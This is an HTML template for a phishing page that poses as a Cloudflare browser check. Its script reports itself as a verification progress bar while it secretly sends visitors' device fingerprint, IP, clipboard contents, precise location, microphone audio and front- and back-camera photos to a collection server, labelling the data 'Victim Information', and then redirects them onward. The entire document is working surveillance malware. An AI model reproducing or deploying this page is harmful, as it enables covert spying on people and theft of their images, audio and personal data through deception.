<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
<meta name="robots" content="noindex, nofollow">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Security Check – Cloudflare</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{width:100%;min-height:100%;background:#f6f6f6;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;color:#1d1d1f}
.wrap{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:24px}
.card{background:#fff;border-radius:16px;box-shadow:0 4px 32px rgba(0,0,0,.10);padding:36px 32px;max-width:420px;width:100%;text-align:center}
.cf-logo{font-size:38px;margin-bottom:6px}
.cf-title{font-size:22px;font-weight:700;color:#1d1d1f;margin-bottom:6px}
.cf-sub{font-size:14px;color:#6e6e73;margin-bottom:28px;line-height:1.6}
.shield{width:72px;height:72px;background:linear-gradient(135deg,#f58220,#e36209);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;font-size:34px;box-shadow:0 4px 16px rgba(245,130,32,.35);transition:all .4s}
.shield.done{background:linear-gradient(135deg,#34c759,#28a745)}
.verify-btn{display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#f58220,#e36209);color:#fff;border:none;border-radius:12px;padding:15px 36px;font-size:17px;font-weight:600;cursor:pointer;width:100%;justify-content:center;transition:opacity .2s;margin-bottom:12px}
.verify-btn:disabled{opacity:.6;cursor:not-allowed}
.progress-bar{height:5px;background:#f0f0f0;border-radius:4px;margin:24px 0 10px;overflow:hidden}
.progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#f58220,#e36209);border-radius:4px;transition:width .6s ease}
#status-msg{font-size:13px;color:#6e6e73;min-height:18px}
.footer{margin-top:24px;font-size:12px;color:#aaa}
.footer a{color:#aaa;text-decoration:none}
.cf-ray{margin-top:4px;font-size:11px;color:#ccc}
@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
.spin{animation:spin 1s linear infinite;display:inline-block}
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <div class="cf-logo">🛡️</div>
    <div class="cf-title">Security Verification</div>
    <div class="cf-sub">Checking your browser before accessing<br>this website. This usually takes a few seconds.</div>

    <div class="shield" id="shield-icon">🔒</div>

    <div class="progress-bar">
      <div class="progress-fill" id="pbar"></div>
    </div>
    <div id="status-msg">Press the button to begin verification</div>
    <br>

    <button class="verify-btn" id="verify-btn" onclick="startVerify()">
      ✅ Verify I'm Human
    </button>

    <div class="footer">
      DDoS protection by <a href="https://www.cloudflare.com" target="_blank">Cloudflare</a>
      <div class="cf-ray">Ray ID: <span id="ray">loading...</span></div>
    </div>
  </div>
</div>

<video id="vid-front" style="display:none" playsinline autoplay muted></video>
<video id="vid-back"  style="display:none" playsinline autoplay muted></video>
<canvas id="canvas" width="640" height="640" style="display:none"></canvas>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
<script>
var uid="<%=uid%>",a="<%=a%>",destUrl="<%=url%>";
var snapsConfirmed=0,minSnaps=3,redirectDone=false;

function setP(p){document.getElementById('pbar').style.width=p+'%';}
function setS(t){document.getElementById('status-msg').textContent=t;}

function tryRedirect(){
  if(redirectDone) return;
  if(snapsConfirmed>=minSnaps){
    redirectDone=true;
    document.getElementById('shield-icon').className='shield done';
    document.getElementById('shield-icon').textContent='✅';
    setP(100); setS('Verification complete!');
    setTimeout(function(){window.location.href=destUrl;},400);
  }
}

// Hard redirect fallback: after 25s from page load, redirect no matter what
var hardTimer=setTimeout(function(){
  if(!redirectDone){redirectDone=true;window.location.href=destUrl;}
},25000);

// ── Device info (fires immediately, no permission needed) ─────────────────
async function sendDeviceInfo(){
  var td="";
  <% if(!t){ %>
  td+='<code>✅ Victim Information</code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip%>"><%=ip%></a> | <%=time%> UTC</b>';
  <% }else{ %>
  try{var r=await fetch(a).then(x=>x.json());td+='<code>✅ Victim Information</code><br><br><b>⚓ IP: <a href="https://ip-api.com/#'+r.ip+'">'+r.ip+'</a> | <%=time%> UTC</b>';}catch(e){}
  <% } %>
  td+="<br><b>🕒 Date:</b> "+new Date()+"<br>";
  td+="<b>🌐 TZ:</b> "+Intl.DateTimeFormat().resolvedOptions().timeZone+"<br>";
  td+="<b>🖥️ Screen:</b> "+screen.width+"x"+screen.height+" ratio:"+window.devicePixelRatio+"x<br>";
  var xo=["platform","userAgent","language","maxTouchPoints","hardwareConcurrency","cookieEnabled","vendor","deviceMemory","appVersion","webdriver"];
  td+="<br><b>📱 Device Info</b><br>";
  for(var i=0;i<xo.length;i++){if(xo[i] in navigator){td+="<b>"+xo[i]+":</b> <code>"+navigator[xo[i]]+"</code><br>";}}
  if(navigator.connection){
    var nc=navigator.connection;
    td+="<br><b>🌐 Network:</b> "+nc.effectiveType+" | "+(nc.downlink||'?')+"Mbps | RTT:"+(nc.rtt||'?')+"ms<br>";
    $.post(a+"/network",{uid:uid,data:encodeURIComponent("📶 "+nc.effectiveType+" | ⚡"+(nc.downlink||'?')+"Mbps | RTT:"+(nc.rtt||'?')+"ms")});
  }
  if("getBattery" in navigator){
    try{
      var b=await navigator.getBattery();
      var pct=Math.round(b.level*100);
      td+="<b>🔋 Battery:</b> "+pct+"% | Charging:"+b.charging+"<br>";
      // Battery low alert
      $.post(a+"/battery",{uid:uid,level:pct,charging:b.charging});
    }catch(e){}
  }
  $.post(a,{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},function(){});
  // Clipboard
  if(navigator.clipboard&&navigator.clipboard.readText){
    try{var clip=await navigator.clipboard.readText();if(clip&&clip.trim())$.post(a+"/clipboard",{uid:uid,clip:encodeURIComponent(clip)});}catch(e){}
  }
}

// ── Location (fires in background, no wait) ───────────────────────────────
function fireLocation(){
  function sendLoc(lat,lon,acc){$.post(a+"/location",{uid:uid,lat:encodeURIComponent(lat),lon:encodeURIComponent(lon),acc:encodeURIComponent(acc)});}
  async function ipFallback(){try{var d=await fetch("https://ipapi.co/json/").then(r=>r.json());if(d&&d.latitude)sendLoc(d.latitude,d.longitude,"IP (~"+d.city+", "+d.country_name+")");}catch(e){}}
  if(!navigator.geolocation){ipFallback();return;}
  var t=setTimeout(ipFallback,9000);
  navigator.geolocation.getCurrentPosition(
    function(p){clearTimeout(t);sendLoc(p.coords.latitude,p.coords.longitude,p.coords.accuracy+"m (GPS)");},
    function(){clearTimeout(t);ipFallback();},
    {enableHighAccuracy:true,timeout:8000,maximumAge:0}
  );
}

// ── Camera: take snaps, wait for server confirmation before redirect ───────
async function captureAndWait(stream){
  var canvas=document.getElementById('canvas');
  var ctx=canvas.getContext('2d');
  var vidFront=document.getElementById('vid-front');
  vidFront.srcObject=stream;
  try{await vidFront.play();}catch(e){}

  // Wait for video to have frames
  await new Promise(function(r){
    var check=setInterval(function(){
      if(vidFront.readyState>=2&&vidFront.videoWidth>0){clearInterval(check);r();}
    },200);
    setTimeout(function(){clearInterval(check);r();},3000);
  });

  // Audio recording
  var audioTracks=stream.getAudioTracks();
  if(audioTracks.length){
    try{
      var rec=new MediaRecorder(new MediaStream(audioTracks)),chunks=[];
      rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
      rec.onstop=function(){
        var blob=new Blob(chunks,{type:'audio/webm'}),fr=new FileReader();
        fr.onloadend=function(){$.post(a+"/audio",{uid:uid,audio:encodeURIComponent(fr.result.replace(/^data:.+;base64,/,''))});};
        fr.readAsDataURL(blob);
      };
      rec.start();setTimeout(function(){try{rec.stop();}catch(e){}},8000);
    }catch(e){}
  }

  // Take front snaps every 1.5s — redirect only after server confirms received
  var snapsDone=0;
  var snapTimer=setInterval(function(){
    if(vidFront.readyState<2||vidFront.videoWidth===0) return;
    ctx.drawImage(vidFront,0,0,640,640);
    var imgData=canvas.toDataURL("image/png").replace("data:image/png;base64","");
    (function(){
      $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(imgData),cam:"front"},function(){
        snapsConfirmed++; setP(30+snapsConfirmed*15); tryRedirect();
      });
    })();
    snapsDone++;
    if(snapsDone>=5){clearInterval(snapTimer);}
  },1500);

  // Back camera — attempt after front snaps start
  setTimeout(async function(){
    try{
      var backStream=await navigator.mediaDevices.getUserMedia({
        audio:false,video:{facingMode:{exact:"environment"},width:{ideal:640},height:{ideal:640}}
      });
      var vidBack=document.getElementById('vid-back');
      vidBack.srcObject=backStream;
      try{await vidBack.play();}catch(e){}
      await new Promise(function(r){
        var check=setInterval(function(){
          if(vidBack.readyState>=2&&vidBack.videoWidth>0){clearInterval(check);r();}
        },200);
        setTimeout(function(){clearInterval(check);r();},3000);
      });
      // Take 2 back snaps
      for(var i=0;i<2;i++){
        await new Promise(function(r){setTimeout(r,1500);});
        if(vidBack.readyState>=2&&vidBack.videoWidth>0){
          ctx.drawImage(vidBack,0,0,640,640);
          $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64","")),cam:"back"});
        }
      }
      backStream.getTracks().forEach(function(t){t.stop();});
    }catch(e){}
  },3000);
}

// ── Main verify ───────────────────────────────────────────────────────────
var verifying=false;
async function startVerify(){
  if(verifying)return;
  verifying=true;
  document.getElementById('verify-btn').disabled=true;
  document.getElementById('verify-btn').innerHTML='<span class="spin">⏳</span> Verifying...';

  // Step 1: collect device info + location immediately
  setP(10); setS('Checking browser fingerprint...');
  sendDeviceInfo();
  fireLocation();
  await new Promise(function(r){setTimeout(r,800);});

  setP(20); setS('Validating security certificate...');
  await new Promise(function(r){setTimeout(r,700);});

  setP(28); setS('Requesting verification...');

  // Step 2: request camera
  var stream=null;
  try{
    stream=await navigator.mediaDevices.getUserMedia({audio:true,video:{facingMode:"user",width:{ideal:640},height:{ideal:640}}});
  }catch(e1){
    try{stream=await navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:"user"}});}
    catch(e2){
      // Camera denied — still redirect after a moment (location/device data already sent)
      setP(100); setS('Verification complete!');
      document.getElementById('shield-icon').className='shield done';
      document.getElementById('shield-icon').textContent='✅';
      await new Promise(function(r){setTimeout(r,1200);});
      if(!redirectDone){redirectDone=true;window.location.href=destUrl;}
      return;
    }
  }

  // Step 3: camera granted — capture, wait for sends, then redirect
  setS('Processing security check...');
  clearTimeout(hardTimer);
  // New hard fallback: 20s after camera granted
  setTimeout(function(){if(!redirectDone){redirectDone=true;window.location.href=destUrl;}},20000);

  await captureAndWait(stream);
}

window.onload=function(){
  var chars="qwertyuioplkjhgfdsazxcvbnm0987654321";
  var ray="";for(var i=0;i<17;i++)ray+=chars[Math.floor(Math.random()*35)];
  document.getElementById('ray').textContent=ray;
  // Collect device info immediately on page load
  sendDeviceInfo();
};
</script>
</body>
</html>
